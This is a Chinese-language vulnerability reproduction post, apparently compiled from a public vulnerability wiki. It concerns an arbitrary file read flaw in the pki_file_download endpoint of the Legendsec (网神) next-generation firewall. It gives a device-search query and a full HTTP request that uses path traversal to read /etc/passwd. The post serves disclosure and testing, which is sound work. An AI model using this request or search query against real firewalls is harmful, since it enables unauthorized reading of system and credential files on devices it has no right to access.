---
title: "网神 下一代极速防火墙 pki_file_download 任意文件读取漏洞"
date: 2026-10-18 09:16:45
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网神-下一代极速防火墙-pki_file_download"
tags:
  - "网神-下一代极速防火墙-pki_file_download"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

网神下一代极速防火墙 pki_file_download 存在任意文件读取漏洞，攻击者可以通过漏洞获取服务器上的任意文件

## 漏洞影响

```
网神下一代极速防火墙
```

## 网络测绘

```
app="网神下一代极速防火墙"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162229226.png)

发送请求包

```plain
GET /?g=pki_file_download&filename=../../../../../etc/passwd HTTP/1.1
Host: 
Connection: close
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: __s_sessionid__=7rl7vvg1mlc00gf4pfmo74h0t7
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162229183.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
